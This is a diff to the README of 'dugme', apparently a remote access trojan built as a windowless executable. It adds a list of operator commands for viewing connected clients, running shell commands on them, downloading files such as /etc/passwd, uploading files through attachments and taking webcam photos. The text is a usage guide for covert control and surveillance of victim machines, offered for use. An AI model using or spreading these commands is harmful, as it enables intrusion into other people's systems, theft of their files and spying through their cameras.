@@ -42,6 +42,39 @@ pyinstaller dugme.py --onefile --noconsole --icon settings.ico
 
 
 
+## dugme commands
+
+- Check online clients 
+```bash
+!session
+```
+- Execute system commands
+```bash
+!shell.<client_username> ls # For Linux
+
+# Eg :
+!shell.agent1 dir
+```
+
+- Download file from system
+```bash
+!getfile.<client_username> /file_path
+
+# Eg :
+!getfile.agent1 /etc/passed
+```
+
+- upload a file via sendint trough attachments
+```bash
+!savefile.<client_username> # + Attachment
+```
+
+- Take phot via webcam
+```bash
+!camsnap.client_username
+```
+
+
 
 ## Author
 
